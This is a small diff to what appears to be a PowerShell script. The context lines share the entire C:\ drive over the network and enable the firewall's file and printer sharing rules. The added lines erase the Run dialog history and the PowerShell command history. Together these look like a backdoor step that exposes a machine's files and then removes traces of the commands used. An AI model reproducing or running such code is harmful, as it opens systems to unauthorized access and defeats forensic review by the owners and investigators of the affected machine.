@@ -206,4 +206,12 @@ $Share = [WmiClass]'Win32_Share'
 
 $Share.Create('C:\', 'netShare', 0)
 
-netsh advfirewall firewall set rule group=\"File and Printer Sharing\" new enable=Yes 
+netsh advfirewall firewall set rule group=\"File and Printer Sharing\" new enable=Yes
+
+
+
+# Delete run box history
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+Remove-Item (Get-PSreadlineOption).HistorySavePath
